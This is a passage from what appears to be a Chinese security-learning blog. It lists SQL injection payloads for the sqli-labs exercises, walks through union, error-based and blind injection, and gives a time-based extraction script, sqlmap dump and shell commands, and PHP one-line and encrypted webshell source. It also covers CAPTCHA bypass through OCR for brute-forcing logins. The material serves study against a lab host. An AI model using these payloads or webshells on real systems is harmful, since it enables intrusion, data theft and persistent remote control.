if(length(database())=8,sleep(3),1)  and ('1')=('11、http://192.168.101.10:12345/Less-1/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n2、http://192.168.101.10:12345/Less-2/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n3、http://192.168.101.10:12345/Less-3/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and'1'='1 \n4、http://192.168.101.10:12345/Less-4/?id=1\") and updatexml(1,concat(0x7e,database(),0x7e),1)  --+ \n5、http://192.168.101.10:12345/Less-5/?id=1' and  updatexml(1,concat(0x7e,database(),0x7e),1)  --+\n6、http://192.168.101.10:12345/Less-6/?id=1\" and  updatexml(1,concat(0x7e,database(),0x7e),1)  --+\n7、http://192.168.101.10:12345/Less-7/?id=1') and if(length(database())=8,sleep(3),1)  and ('1')=('1\n8、http://192.168.101.10:12345/Less-8/?id=1' and  if(length(database())=8,sleep(3),1) and '1'='1\n9、http://192.168.101.10:12345/Less-9/?id=1' and  if(length(database())=8,sleep(3),1) and '1'='1\n10、http://192.168.101.10:12345/Less-10/?id=1\" and if(length(database())=8,sleep(3),1) --+\n11、uname=admin' or updatexml(1,concat(0x7e,database(),0x7e),1) --+ &passwd=admin\n12、uname=admin\" or updatexml(1,concat(0x7e,database(),0x7e),1) or \"1\" = \"1 &passwd=admin\n13、uname=admin' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1 &passwd=admin\n14、uname=admin\" or updatexml(1,concat(0x7e,database(),0x7e),1)  or \"1\"=\"1 &passwd=admin\n15、uname=admin'  and if(length(database())=8,sleep(3),1) --+ &passwd=adminuname=admin'  and if(length(database())=8,sleep(3),1) --+ &passwd=admin\n16、uname=admin\")  and if(length(database())=8,sleep(3),1) --+ &passwd=admin\n17、uname=admin&passwd=admin'and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n18、user-agent: ',updatexml(1,concat(0x7e,database(),0x7e),1),'1') #\n19、Refer:  ',updatexml(1,concat(0x7e,database(),0x7e),1),'1') #\n20、Cookie:  uname=12345' and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n21、Cookie: uname=MTIzNDUnIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCcxJz0nMQ==\n12345' and updatexml(1,concat(0x7e,database(),0x7e),1) and'1'='1\n22、Cookie: uname=MTIzNDUiIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCIxIj0iMQ==\n12345\" and updatexml(1,concat(0x7e,database(),0x7e),1) and\"1\"=\"1\n23、http://192.168.101.10:12345/Less-23/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1\n24、# 先注册  \nusername  admin'#\npassword  123456\n# 更改密码\nusername admin'#\npassword 654321\n# 实际结果如下，反而改了admin 用户的密码\n25、http://192.168.101.10:12345/Less-25/?id=1' %26%26 updatexml(1,concat(0x7e,database(),0x7e),1) --+\n26、http://192.168.101.10:12345/Less-26/?id=1'%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20'1'='1\n27、http://192.168.101.10:12345/Less-27/?id=1'%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20'1'='1\n28、http://192.168.101.10:12345/Less-28/?id=1'%20%26%26%20%20length(database())=8%20%26%26%20'1'= '1\n29、http://192.168.101.10:12345/Less-29/?id=1'%26%26 updatexml(1,concat(0x7e,database(),0x7e),1) --+\n30、http://192.168.101.10:12345/Less-30/?id=1\"%20%26%26%20%20length(database())=8%20%26%26%20\"1\"=\"1\n31、http://192.168.101.10:12345/Less-31/?id=1\"%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20\"1\"=\"1\n32、http://192.168.101.10:12345/Less-32/?id=1%df' and length(database())=8 --+  (burp才行)\n33、同上\n34、uname=Dumb%df' and updatexml(1,concat(0x7e,database(),0x7e),1)#&passwd=Dumb  burp\n35、http://192.168.101.10:12345/Less-35/?id=1 and  updatexml(1,concat(0x7e,database(),0x7e),1)  --+ \n36、http://192.168.101.10:12345/Less-36/?id=1%df' and updatexml(1,concat(0x7e,database(),0x7e),1)--+ \n37、uname=Dumb%df'and updatexml(1,concat(0x7e,database(),0x7e),1) --+ &passwd=Dumb&submit=Submit\n38、http://192.168.101.10:12345/Less-38/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and'1'='1\n39、http://192.168.101.10:12345/Less-39/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)  and  1=2 #\n40、http://192.168.101.10:12345/Less-40/?id=1' and length(database())=8 and '1'='1\n41、http://192.168.101.10:12345/Less-41/?id=1 and length(database())=8\n42、login_user=admin&mysubmit=Login&login_password=admin';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma500.php\";#\n43、login_user=admin&mysubmit=Login&login_password=admin');select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma501.php\";#\n44、mysubmit=Login&login_user=admin&login_password=admin';select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma44.php\";#\n45、mysubmit=Login&login_user=admin&login_password=admin');select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma45.php\";#\n46、http://192.168.101.10:12345/Less-46/?sort=1  and updatexml(1,concat(0x7e,database(),0x7e),1)\n47、http://192.168.101.10:12345/Less-47/?sort=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+\n48、http://192.168.101.10:12345/Less-48/?sort=1 and if(length(database())=7,sleep(3),1)\n49、http://192.168.101.10:12345/Less-49/?sort=1' and if(length(database())=8,sleep(3),1) and '1'='1\n50、http://192.168.101.10:12345/Less-50/?sort=1; select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma50.php\";#\n51、http://192.168.101.10:12345/Less-51/?sort=1'; select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma51.php\";#\n52、http://192.168.101.10:12345/Less-52/?sort=1; select \"<?php @eval($_GET['a']);?>\" into outfile \"/var/www/html/test/muma52.php\";#\n```\n\n总结：\n\n测试的时候要实验全一些\n\n1、id=1,id=1',id=1\";id=1'); id=1')); id=1\"); id=1\"));  --+; # ; 以及没有注释，需要补全的情况\n\n```\nhttp://192.168.101.10:12345/Less-7/?id=1\nhttp://192.168.101.10:12345/Less-7/?id=1'\nhttp://192.168.101.10:12345/Less-7/?id=1')\nhttp://192.168.101.10:12345/Less-7/?id=1'))\nhttp://192.168.101.10:12345/Less-7/?id=1\" \nhttp://192.168.101.10:12345/Less-7/?id=1\") \nhttp://192.168.101.10:12345/Less-7/?id=1\"))\n\n找到报错的情况后 (非注释)\nhttp://192.168.101.10:12345/Less-7/?id=1' and '1'='1\nhttp://192.168.101.10:12345/Less-7/?id=1') and ('1')=('1\nhttp://192.168.101.10:12345/Less-7/?id=1'))  and (('1'))=(('1\n\nhttp://192.168.101.10:12345/Less-7/?id=1\" and \"1\"=\"1\nhttp://192.168.101.10:12345/Less-7/?id=1\") and (\"1\")=(\"1\nhttp://192.168.101.10:12345/Less-7/?id=1\")) and ((\"1\"))=((\"1\n\n```\n\n2、怎么测试都没有回显，上述测试的加上时间型盲注\n\n```\nhttp://192.168.101.10:12345/Less-10/?id=1\" and if(length(database())=8,sleep(3),1) --+\n```\n\n3、登录类型的，账号和密码都要分开尝试\n\n4、http 头注要根据报错，获取头所在的位置\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"SQL 注入","url":"/2023/11/28/Web渗透/SQL注入/","content":"\n\n\n\n\n#### 一、数据类型\n\n1）数字型\n\n```mysql\nselect * from tables where id=1;\n```\n\n2）字符型\n\n```mysql\nselect * from tables where username='zz'\n```\n\n3）搜索型\n\n```mysql\nselect * from tables where id like '%woniu%'\n```\n\n#### 2、注入步骤 - 联合注入\n\n1） 通过and 1=2 ,and 1=2 以及单引号等特殊语句来确定是否存在注入点，and 1=1 和and 1=2 返回不一致，代表有注入点，测试时注意字符型和数字型的区别，and 1=1 正常返回结果，and 1=2 没有返回\n\n```mysql\n?id=1 and 1=2\n```\n\n2）order by 确定列数  order by number 超过列数就会报错\n\n```mysql\n?id=1 order by number\n```\n\n当number =1，2，3 时，正常返回，=4 时报错，说明只有3列。\n\n![image-20231212214745852](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212214745852.png)\n\n![image-20231212214807482](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212214807482.png)\n\n\n\n3）union  的用法\n\n- 查询列数\n\n  union 来查询列数，1，2，3代表有三列。\n\n  ![image-20231212215220327](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212215220327.png)\n\n- 将主查询项改为负数或者不存在\n\n```mysql\n\n# id= -1? union select 1,2,3 如下图所示，可以看出，2 是标题，3 是正文，这样2，3就可以替换成一些内置的mysql函数来泄露一些信息，如SYSTEM_USER(),@@VERSION,@@PORT\n\n?id=-1 union select 1,2,@@PORT\n\n# 在能够回显的情况下，可以做任意支持的查询，如sql语句，内置的函数\n?id=-1 union select 1,2,(select password from user_account limit 1)\n\n```\n\n![image-20231212215332158](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212215332158.png)\n\n\n\n\n\n4）information_schema  查询表的相关信息 \n\n![image-20231212220345756](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212220345756.png)\n\n```mysql\n# 查询某库的表名\nselect group_concat(TABLE_NAME) from information_schema.TABLES where table_schema='库名'\n\n# 查询某库的所有列名\nselect group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema='库名' \n\n# 查询所有数据库的名字\nselect group_concat(distinct(table_schema)) from information_schema.tables\nselect GROUP_CONCAT(SCHEMA_name) from information_schema.SCHEMATA\n\n\n# 如果存在phpmyadmin，可以尝试访问，后台如果认证方式是config，则可以直接进入后台，如果是http，则可以爆破，最好不好开启phpmyadmin,或者在需要的时候开启远访问。\n配置文件路径\n/opt/lampp/phpmyadmin/config.inc.php\n/opt/lampp/etc/extra/httpd-xampp.conf\n\n```\n\n![image-20231128223453160](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231128223453160.png)\n\n```\nrequire local  允许本地\n\nrequire all granted 运行所有\n```\n\n![image-20231128224013374](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231128224013374.png)\n\n5） 查询密码\n\n```mysql\nselect CONCAT(user,'==',PASSWORD) from mysql.user limit 1\n```\n\n6） 针对已经加了addslashes函数的后台\n\n```\ntable_name = 'learn'  等效于 table_name = hex('learn') \n```\n\n7)非数字型\n\n```\n\n# 正常情况下\nselect * from user_account where password like '%123%'\n\n#  测试 123%'-- '\n\nselect * from user_account where password like '%123%'-- '%'\n\n#  测试 123%'#'\n\nselect * from user_account where password like '%123%'#'%'\n\n\n```\n\n8）、读写权限确认\n\n```\nshow GLOBAL VARIABLES like '%secure%'\nsecure_file_priv = 空  任意\nsecure_file_priv = 路径  该路径下可读写\nsecure_file_priv = NULL  不可读写\n\n测试语句 \nselect LOAD_FILE('/etc/passwd')\n真实情况下，可以使用burp 爆破路径下的文件\n代理-》发送到intruder->选择payload点-》选择payload, 攻击\n```\n\n9）、写木马\n\n```\n# 需要有写权限\n\nid=-1 union select 1,2,'<?php @eval($_GET[\"a\"]);?>' into outfile '/opt/lampp/htdocs/learn/test/muma.php'\n\n# 一句话木马\n<?php @eval($_GET['a']);?>\n<?php @eval($_POST['a']);?>  可以传的数据更多，一般用post\neval 可以将一段字符串当成代码来执行，如果用户可以直接将这段有效的代码传入后台，则可以直接执行任意代码或者指令。\n```\n\n![image-20231212224226407](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212224226407.png)\n\n10）、木马连接  \n\n选择蚁剑  或者菜刀，菜刀连接失败，可能是php版本太高，一些函数不支持\n\n配置如下\n\n![image-20231129232521050](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231129232521050.png)\n\n打开虚拟终端，测试下\n\n![image-20231129232556459](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231129232556459.png)\n\n抓包 发现是明文的代码，估计绕不过WAF\n\n![image-20231206223640528](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231206223640528.png)\n\n冰蝎是加密的，可以试用一下，配置麻烦一些，需要把冰蝎的server的木马文件（webshell）上传到目标主机，需要设置好密码。\n\nphp版本 的如下\n\n```\n<?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\n\n```\n\n上传可通过文件上传漏洞，或者放到一个公网服务器上，用一句话木马下载到特定目录。\n\n![image-20231206224901291](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231206224901291.png)\n\n![image-20231206224454319](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231206224454319.png)\n\n![image-20231206224744604](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231206224744604.png)\n\n#### 三、报错注入\n\n利用updatexml 实现报错，union 不好用的情况下用，如果die函数把报错屏蔽了就没法用了。\n\n```\nupdatexml(1,concat(0x7e,database(),0x7e),1) concat(0x7e,database(),0x7e) 这个xml路径不存在就会报错\ndatabase()这个可以用任意的sql语句来代替，跟以上union 就一样了\n```\n\n![image-20231212225405909](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212225405909.png)\n\n#### 四、盲注\n\n- 布尔盲注\n\n  基于真假的判断，不管输入什么，结果都只返回真或者假两种情况。通过表达式结果与已知的值进行比对，根据比对结果来判断正确与否。如下所示，通过length 函数判断sql函数database()的结果，如果为真，显示正常页面，如果为假，不显示正常页面，代表布尔盲注成功。\n\n  ![image-20231212230217834](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231212230217834.png)\n\n  盲注经常用到的函数\n\n  ```\n  length() # 先猜测长度，从而知道循环遍历的长度\n  substr(string,start,length)  es. substr(database(),1,1)='L'  从1 开始的长度为1 的字符，可以用来遍历查找表名，列名 \n  left(string，n) 截取左边的n个字符\n  ord()  函数返回字符串第一个字符的ASCII值\n  ```\n\n- 时间型盲注\n\n  ```\n  id=1 and if (length(database())=5,sleep(3),1)\n  id=1 and if (substr(database(),1,1)='a',sleep(3),1)\n  \n  ```\n\n  如果满足条件 如 length(database())=5，则休眠三秒，如果不满足则返回1，显示正常结果\n\n  用python 代码实现比较快一些，获取数据库的名字\n\n  ```\n  import time\n  import requests\n  \n  len = 0\n  for i in range(1,50):\n      start = time.time()\n      header = {\"Cookie\":\"PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341\"}\n      url = f'http://192.168.101.10/learn/read.php?id=1 and if (length(database())={i},sleep(3),1)'\n      resp = requests.get(url=url,headers=header)\n      end = time.time()\n      if int(end-start)>=3:\n          len = i\n          break\n  \n  database = ''\n  for i in range(1,len+1):\n      for letter, index in enumerate(range(ord('a'), ord('z') + 1)):\n          start = time.time()\n          header = {\"Cookie\":\"PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341\"}\n          strxx = chr(index)\n          url = f\"http://192.168.101.10/learn/read.php?id=1 and if (substr(database(),{i},1)='{strxx}',sleep(3),1)\"\n          resp = requests.get(url=url,headers=header)\n          end = time.time()\n          if int(end-start)>=3:\n              database = database + strxx\n  print(database)\n  ```\n\n\n#### 五、sqlmap的使用\n\n```bash\npython sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\"\n\n```\n\n出现以下注入payload\n\n```\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: Boolean-based blind - Parameter replace (original value)\n    Payload: id=(SELECT (CASE WHEN (3590=3590) THEN 1 ELSE (SELECT 7831 UNION SELECT 8509) END))\n\n    Type: error-based\n    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1 OR (SELECT 8258 FROM(SELECT COUNT(*),CONCAT(0x7178626271,(SELECT (ELT(8258=8258,1))),0x716b627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND (SELECT 3666 FROM (SELECT(SLEEP(5)))suGs)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=-2433 UNION ALL SELECT NULL,NULL,CONCAT(0x7178626271,0x54667651697a4b4e535a567479494b4e4b4f79614b614d76574259635064427152596e6376635a6e,0x716b627171)-- -\n```\n\n常见的sqlmap命令\n\n```\n   # 查看所有的数据库\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dbs\n   # 查看当前数据库\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --current-db\n   # 查看当前数据库的表\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --tables -D \"learn\"\n   # 查看当前表的所有列\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --tables --columns -T \"article\" -D \"learn\"\n   # 获取表中的内容\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dump -C \"articleid,content,headline\" -T \"article\" -D \"learn\"\n   # 指定数据库类型，判断是不是DBA\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dbms=mysql --is-dba\n   # 写入shell(一般失败的可能性比较大)\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dbms=mysql --os-shell\n   # 读取文件\n   python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dbms=mysql --file-read \"/etc/passwd\"\n   # 手动写入木马\n   48  python sqlmap.py  http://192.168.101.10/learn/read.php?id=1 --cookie=\"PHPSESSID=ce719860bce9263a3b4abf175eb31522\" --dbms=mysql --file-write .\\muma.php --file-dest /opt/lampp/htdocs/learn/test/muma_demo.php\n```\n\n#### 六、其他注入\n\n- 更新注入，更新类的操作更多是返回布尔的结果，因此也只能通过报错注入来实现。\n\n```mysql\ninsert into user(username,password,role) values('wow' or updatexml(1,concat(0x7e,(database()),0x7e),1) or '',123456,'user'))\n#  'wow' or updatexml(1,concat(0x7e,(database()),0x7e),1) or '' 是username \nupdate user set password='111' or updatexml(1,concat(0x7e,(database()),0x7e),1) or '' where userid=1\n# password = 111' or updatexml(1,concat(0x7e,(database()),0x7e),1) or '\n```\n\n- 堆叠注入\n\n  在一个执行的语句中可以执行多条sql语句\n\n  ```mysql\n  select * from user where userid=1;update user set password='123456' where userid=1\n  # 1;update user set password='123456' where userid=1  是payload\n  ```\n\n  实现的条件是  $conn->multi_query() 可以执行多条语句。\n\n- 二次注入\n\n  先注册后更新的场景  前面转义后面没转义\n\n  ```\n  insert into user(name,password) values('woniu\\'#','123456')\n  update into user()\n  \n  # 注册\n  $username = addslashes($_POST['username']);\n  $password = addslashes($_POST['password']);\n  \n  $sql = insert into user(name,password) values($username,$password);\n  $conn->query(sql);\n  # 更新\n  \n  $username = $_POST['username'];\n  $password = $_POST['password'];\n  $sql = \"update user set password='$password' where username='$username'\";\n  $conn->query($sql);\n  \n  # update user set password='123456' where username='woniu'#' 从而修改了已有的用户的密码\n  ```\n\n  \n\n- 宽字符注入\n\n  实现要求： 要求gbk编码(两个字节的编码)，并且采用了addslashes()函数进行转义\n\n  ```mysql\n  select * from article where articleid='$id'\n  # 输入id=1'  就变成了select * from article where articleid='1\\''\n  # 在gbk 中输入1%bf的时候，%bf和\\会形成一个新的汉字，从而导致语句如下\n  select * from article where articleid='1%bf%5c' union  select 1,2,3,4 -- '\n  \n  ```\n\n- 二次编码注入\n\n  ```$rows\n  $conn = create_connection_oop();\n  $id = urldecode(addslashes($_GET['id']));\n  echo $id .\"<br>\";\n  $result = $conn->>query(\"select * from user where userid='$id'\");\n  $rows = $result->fetch_row();\n  var_dump($rows);\n  \n  # id = 1%2527 and 1=1 --+  url解码以后编程下面\n  # id = 1' and 1=1 --+\n  \n  ```\n\n  \n\n#### 七、一些技巧\n\n- 确定字符串可以使用hex函数转成16进制来处理，避免引号转义等问题。\n\n  ```\n  select hex('/etc/passwd') # 2F6574632F706173737764\n  \n  select LOAD_FILE(0x2F6574632F706173737764)\n  ```\n\n- WAF 绕过\n\n  ```\n  双写绕过  selselectect,anandd\n  大小写绕过\n  编码绕过\n  特殊字符绕过\n  ```\n\n- 代码注入  \n\n  可以执行代码的函数\n\n  eval ,assert,preg_replace,create_function\n\n- 命令注入\n\n  php可以执行命令的函数\n\n  system,exec ,shell_exec,passthru \n\n  以及任何可能接收前端输入，后台执行的地方都可能造成命令注入\n\n- HTTP 头注入\n\n  ```\n  # 假设站点会收集用户的访问信息，后台代码如下\n  \n  $useragent = $_SERVER['HTTP_USER_AGENT'];\n  $refer = $_SERVER['HTTP_REFER'];\n  $xforward =$_SERVER['HTTP_X_FORWORDED_FOR'];\n  \n  $sql = \"insert into header(useragent,refer,xforward) values('$useragent\n  ','$refer','$xforward')\";\n  $conn->query($sql);\n  \n  # 构造payload，自行更改字段，如X-Forwarded-FOR:'or updatexml(1,concat(0x7e,databse(),0x73),1)'\n  \n  # 这样就可以完成注入。\n  ```\n\n  \n","tags":["web渗透"],"categories":["web渗透"]},{"title":"验证码原理","url":"/2023/11/16/Web渗透/验证码相关/","content":"\n1、简单代码如下：\n\n```\n<?php\n// <!-- 利用Session 保存图片验证码 -->\nsession_start();  // 当客户端已经获取Session ID，只要通过HTTP请求中的Cookies 字段发送给服务器，服务器不再生成\nfunction get_vcode($vlen=4,$width=80,$height =25)\n{\n    // 定义响应类型为png\n    header(\"content-type:image/png\");\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $vcode = substr(str_shuffle($chars),0,$vlen);\n\n    $_SESSION['vcode'] = $vcode;\n    // 定义图片的背景 RGB 100 200 100\n    $image = imagecreate($width,$height);\n    $imgColor = imagecolorallocate($image,100,200,100);\n\n    // 绘制黑色文字\n    $color = imagecolorallocate($image,0,0,0);\n    imagestring($image,5,20,5,$vcode,$color);\n\n    //生成一批随机位置的干扰点\n    for($i=0;$i<50;$i++)\n    {\n        imagesetpixel($image,rand(0,$width),rand(0,$height),$color);\n    }\n    // 输出图片\n    imagepng($image);\n    imagedestory($image);\n}\n\nget_vcode();\n\n?>\n```\n\n2、验证码 保存在session 中，可以在服务器上进行确认，路径如下\n\n![image-20231116225534220](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231116225534220.png)\n\n3、设置验证码，使用一次就失效，防止重放\n\n```\n# 每次登录用过一次，清空vcode\nunset($_SESSION['vcode']);\n```\n\n![image-20231120212216632](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231120212216632.png)\n\n![image-20231120212242558](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231120212242558.png)\n\n全部报 vcode-error ，在服务器的session 中没有vcode 字段，防止一个通过的验证码一直重用。\n\n修改代码如下：\n\n```php\n\nif(isset($_SESSION['vcode']) && $_SESSION['vcode'] != $captcha)\n{\ndie('vcode-error');\n}\n\n\n// 清空验证码\nif (isset($_SESSION['vcode']))\n{\nunset($_SESSION['vcode']);\n}\n  \n```\n\n 4、避免Cookie 验证码\n\n  Cookie在客户端保存，如果把验证码保存在Cookie 中，那么可以客户端可以直接操作Cookie和用户输入一致就可以绕过验证码了，无任何实际作用。\n\n5、验证码识别\n\n百度云API接口，有免费额度\n\n- 获取access_token\n\n  ```python\n  import requests\n  import json\n  \n  \n  def main():\n          \n      url = \"https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=xxxxxx&client_secret=xxxxx\"\n      \n      payload = \"\"\n      headers = {\n          'Content-Type': 'application/json',\n          'Accept': 'application/json'\n      }\n      \n      response = requests.request(\"POST\", url, headers=headers, data=payload)\n      \n      print(response.text)\n      \n  \n  if __name__ == '__main__':\n      main()\n  ```\n\n- 调用API接口\n\n  ```\n  \n  # encoding:utf-8\n  \n  import requests\n  import base64\n  \n  '''\n  通用文字识别\n  '''\n  \n  request_url = \"https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic\"\n  # 二进制方式打开图片文件\n  f = open('[本地文件]', 'rb')\n  img = base64.b64encode(f.read())\n  \n  params = {\"image\":img}\n  access_token = '[调用鉴权接口获取的token]'\n  request_url = request_url + \"?access_token=\" + access_token\n  headers = {'content-type': 'application/x-www-form-urlencoded'}\n  response = requests.post(request_url, data=params, headers=headers)\n  if response:\n      print (response.json())\n  ```\n\n  - burp 插件 captcha-killer 使用\n  \n    \n  \n    - 下载地址\n  \n    \n    ​      https://github.com/Ta0ing/captcha-killer-java8\n    \n    - 安装\n    \n  \n    ![image-20231121233928556](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231121233928556.png)\n  \n     随后工具栏就会有captcha-killer，接下来burp 开启代理抓验证码的包以后action，发送到captcha-killer\n    \n    ![image-20231121234031807](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231121234031807.png)\n    \n    首先点击获取，获取到验证码，代表插件工作正常，获取不到报错，代表burp 版本和插件版本不符，换版本吧，随后接口URL那里选用\t百度ocr的模板，更改POST对应的接口以及access_token，随后点击识别，出现识别结果，标记识别结果后会生成对应的匹配规则，点击匹配，每次都会在右边生成验证码以及识别结果。\n    \n    \n    \n    ![image-20231122220551550](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231122220551550.png)\n    \n    - 实际操作\n    \n      vcode请求发送给captcha-killer，输入用户名，密码，验证码后发送给intruder，保证session 一致。\n    \n      ![image-20231122215441449](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231122215441449.png)\n    \n      ![image-20231122215355706](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231122215355706.png)\n    \n      ![image-202311222154231371](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231122215423137.png)\n    \n      ![image-20231122215322576](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231122215322576.png)\n    \n      - 注意：\n    \n        payload 多线程可能导致匹配逻辑问题\n    \n        有时候可能不如自己写python 处理来的自由\n\n- 登录防护\n  - 验证码不建议图片\n  - 登录次数，记录IP\n  - 多因素认证\n  - 记录常用地区，不在常用地区登录，预警\n  - token的使用\n\n```php\n\n//增加失败次数超过5，限制登录一个小时\n\n<?php\n    include \"common.php\";\n    /**\n     * 获取请求数据的方式\n     * GET   $_GET  获取GET请求的地址参数数据\n     * POST  $_POST 获取POST请求的正文数据\n     */\n    \n    $username = addslashes($_POST['username']);\n    $password = $_POST['password'];\n    $captcha = $_POST['captcha'];\n\n    //万能验证码 存在安全漏洞 OWASP-认证和授权失败\n\n    if ($captcha !=='0000')\n    {\n        if(isset($_SESSION['vcode']) && $_SESSION['vcode'] != $captcha)\n        {\n            die('vcode-error');\n        }\n               \n    }\n    // 清空验证码\n    if (isset($_SESSION['vcode']))\n    {\n        unset($_SESSION['vcode']);\n    }\n    $conn = create_connection_oop();\n\n    $sql = \"select userid,username,password,failcount,TIMESTAMPDIFF(Minute,now(),lasttime) from user_account where username= ?\";\n    $stmt = $conn->prepare($sql);\n    $stmt->bind_param(\"s\",$username);\n    // 绑定结果参数\n    $stmt->bind_result($userid,$username1,$password1,$failcount,$time_diff);\n    $stmt->execute();\n    $stmt->store_result();\n\n    if($stmt->num_rows == 1)\n    {\n        $stmt->fetch();\n        // echo $time_diff;\n        if($failcount > 5 && $time_diff < 60)\n        {   \n            die(\"user-locked, please wait...\");   \n        }\n\n        if($password == $password1)\n        {\n\n            echo \"login-success\";\n            echo \"<script>location.href='hello.php'</script>\";\n\n              //登录成功后记录session变量\n\n            $_SESSION['username'] = $username;\n            $_SESSION['islogin'] = 'true';\n\n            $new_sql = \"update user_account set failcount = 0 where username= ?\";\n            $stmt = $conn->prepare($new_sql);\n            $stmt->bind_param(\"s\",$username);\n            $stmt->execute();\n\n        }\n        else{\n            echo \"login-fail\";\n            echo \"<script>location.href='login.html'</script>\";\n            // 失败failcount加1 记录当前时间\n            $new_sql = \"update user_account set failcount = failcount+1,lasttime=now() where username= ?\";\n            $stmt = $conn->prepare($new_sql);\n            $stmt->bind_param(\"s\",$username);\n            $stmt->execute();\n\n        }\n    }\n        \n    else{\n        echo \"login-fail\";\n        echo \"<script>location.href='login.html'</script>\";\n        // 失败failcount加1 记录当前时间\n        